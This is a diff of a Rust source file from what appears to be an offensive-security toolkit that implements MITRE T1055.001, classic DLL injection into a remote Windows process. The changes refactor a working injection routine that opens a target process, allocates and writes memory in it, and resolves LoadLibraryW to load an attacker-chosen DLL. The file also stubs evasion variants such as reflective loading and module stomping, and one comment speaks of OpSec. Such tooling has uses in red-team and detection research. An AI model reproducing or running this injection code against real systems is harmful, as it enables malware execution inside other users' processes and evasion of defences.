@@ -2,17 +2,7 @@
 //!
 //! Provides modular capabilities to inject DLLs into remote processes.
 
-use crate::{
-    error,
-    error::InjectumError,
-    info,
-    payload::Payload,
-    strategy::{Method, Strategy, Technique},
-    target::Target,
-};
-
 use std::{
-    ffi::c_void,
     mem::transmute,
     os::windows::{ffi::OsStrExt, raw::HANDLE},
     path::Path,
@@ -36,13 +26,21 @@ use windows_sys::{
     w,
 };
 
-/// The strategy implementation for T1055.001 (Dynamic-link Library Injection).
-pub(crate) struct T1055_001;
+use crate::{
+    error::InjectumError,
+    info,
+    payload::Payload,
+    strategy::{Method, Strategy, Technique},
+    target::Target,
+};
 
-/// Internal enum to strictly define sub-techniques.
+/// The strategy implementation for T1055.001 (Dynamic-link Library Injection).
+pub struct T1055_001;
+
+/// Defines the supported sub-techniques for this strategy.
 #[derive(Debug, PartialEq)]
 enum InjectionMethod {
-    DLLInjection,
+    ClassicDLLInjection,
     ReflectiveDLLInjection,
     MemoryModule,
     ModuleStomping,
@@ -53,7 +51,7 @@ impl TryFrom<Method> for InjectionMethod {
 
     fn try_from(method: Method) -> Result<Self, Self::Error> {
         match method.0 {
-            "DLLInjection" => Ok(Self::DLLInjection),
+            "ClassicDLLInjection" => Ok(Self::ClassicDLLInjection),
             "ReflectiveDLLInjection" => Ok(Self::ReflectiveDLLInjection),
             "MemoryModule" => Ok(Self::MemoryModule),
             "ModuleStomping" => Ok(Self::ModuleStomping),
@@ -63,8 +61,8 @@ impl TryFrom<Method> for InjectionMethod {
 }
 
 impl Strategy for T1055_001 {
-    fn requires_pid(&self, method: Method) -> bool {
-        !matches!(method.0, "Self")
+    fn requires_pid(&self, _method: Method) -> bool {
+        true
     }
 
     fn execute(
@@ -76,32 +74,32 @@ impl Strategy for T1055_001 {
         let info = Technique::T1055_001.info();
         info!("Strategy: {} ({})", info.mitre_id, info.name);
 
-        // 1. Validate inputs
-        let pid = target.pid().ok_or_else(|| {
-            error!("Missing PID for target.");
-            InjectumError::PidRequired(info.mitre_id)
-        })?;
+        let variant: InjectionMethod = method.try_into()?;
 
+        // 1. Validate Target (PID required)
+        let pid = target
+            .pid()
+            .ok_or(InjectumError::PidRequired(info.mitre_id))?;
+
+        // 2. Validate Payload (Must be DllFile with a valid path)
         let dll_path = match payload {
             Payload::DllFile { path: Some(p), .. } => p,
             _ => {
                 return Err(InjectumError::PayloadMismatch {
                     strategy: info.mitre_id,
-                    payload_type: "Payload must be DllFile with a valid path",
+                    payload_type: "DllFile",
                 });
             }
         };
 
-        let variant: InjectionMethod = method.try_into()?;
-
-        // 2. Enforce "DLLInjection" method only for now
+        // 3. Execution based on variant
         match variant {
-            InjectionMethod::DLLInjection => {
-                info!("Method: DLL Injection");
-                dll_injection(pid, dll_path)
+            InjectionMethod::ClassicDLLInjection => {
+                info!("Method: Classic DLL Injection");
+                inject_dll_classic(pid, dll_path)
             }
             _ => Err(InjectumError::MethodNotSupported(format!(
-                "Method '{}' is not supported in this simplified version. Use 'DLLInjection'.",
+                "Method variant '{:?}' is not yet implemented.",
                 method.0
             ))),
         }
@@ -125,13 +123,14 @@ impl Drop for HandleGuard {
     }
 }
 
-/// [DLL Injection]
-fn dll_injection(pid: u32, path: &Path) -> Result<(), InjectumError> {
-    // 1. Convert the Path to a UTF-16 null-terminated wide string (required by Windows APIs).
+/// [Classic DLL Injection]
+/// Performs classic DLL injection using `LoadLibraryW`.
+fn inject_dll_classic(pid: u32, path: &Path) -> Result<(), InjectumError> {
+    // 1. Prepare Path
     let wide_path = to_utf16_null_terminated(path);
-    let size_in_bytes = wide_path.len() * 2;
+    let size_in_bytes = wide_path.len() * size_of::<u16>();
 
-    // 2. Open the target process.
+    // 2. Open Target Process
     // We request only the specific permissions needed, rather than PROCESS_ALL_ACCESS which is better for OpSec and "Least Privilege".
     let process_handle = unsafe {
         OpenProcess(
@@ -153,7 +152,7 @@ fn dll_injection(pid: u32, path: &Path) -> Result<(), InjectumError> {
 
     let process_handle_guard = HandleGuard::new(process_handle);
 
-    // 3. Allocate Memory
+    // 3. Allocate Memory in Target
     let remote_buffer = unsafe {
         VirtualAllocEx(
             process_handle_guard.0,
@@ -170,33 +169,26 @@ fn dll_injection(pid: u32, path: &Path) -> Result<(), InjectumError> {
         }));
     }
 
-    // 4. Write to Memory
+    // 4. Write DLL Path to Target Memory
     let mut bytes_written: usize = 0;
 
     let write_success = unsafe {
         WriteProcessMemory(
             process_handle_guard.0,
             remote_buffer,
-            wide_path.as_ptr() as *const c_void,
+            wide_path.as_ptr().cast(),
             size_in_bytes,
             &mut bytes_written,
         )
     };
 
-    if write_success == 0 {
+    if write_success == 0 || bytes_written != size_in_bytes {
         return Err(InjectumError::Win32Error("WriteProcessMemory", unsafe {
             GetLastError()
         }));
     }
 
-    if bytes_written != size_in_bytes {
-        return Err(InjectumError::Win32Error(
-            "WriteProcessMemory (Partial Write)",
-            0,
-        ));
-    }
-
-    // 5. Get the address of LoadLibraryW
+    // 5. Resolve LoadLibraryW Address
     let kernel32 = w!("kernel32.dll");
 
     let module_handle = unsafe { GetModuleHandleW(kernel32) };
@@ -207,9 +199,9 @@ fn dll_injection(pid: u32, path: &Path) -> Result<(), InjectumError> {
         }));
     }
 
-    let load_library_name: PCSTR = c"LoadLibraryW".as_ptr() as PCSTR;
+    let func_name = c"LoadLibraryW";
 
-    let proc_address = unsafe { GetProcAddress(module_handle, load_library_name) };
+    let proc_address = unsafe { GetProcAddress(module_handle, func_name.as_ptr() as PCSTR) };
 
     if proc_address.is_none() {
         return Err(InjectumError::Win32Error("GetProcAddress", unsafe {
@@ -249,6 +241,7 @@ fn dll_injection(pid: u32, path: &Path) -> Result<(), InjectumError> {
 
 // [ModuleStomping] Loads a decoy DLL and overwrites it.
 
+/// Helper: Converts a Rust Path to a null-terminated UTF-16 vector.
 fn to_utf16_null_terminated(path: &Path) -> Vec<u16> {
     path.as_os_str().encode_wide().chain([0]).collect()
 }
